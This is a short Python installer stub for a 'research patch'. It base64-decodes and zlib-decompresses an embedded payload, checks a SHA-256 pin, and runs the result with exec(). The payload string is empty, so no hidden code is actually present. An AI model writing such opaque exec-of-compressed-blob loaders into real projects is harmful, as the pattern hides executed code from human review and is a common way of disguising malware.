#!/usr/bin/env python3
# TARGETDOMAINTRACE1A source installer. The executable patch body is compressed only
# to keep this research patch self-contained; SHA-256 pins the readable source body.
import base64, hashlib, zlib
PAYLOAD_SHA256 = "573563e7fd154333149dd1fed74a94a339e186bc8c368458636a29cb06acb8a9"
PAYLOAD = ""
source = zlib.decompress(base64.b64decode(PAYLOAD))
if hashlib.sha256(source).hexdigest() != PAYLOAD_SHA256:
    raise SystemExit("TARGETDOMAINTRACE1A embedded patch SHA-256 mismatch")
exec(compile(source, __file__, "exec"))
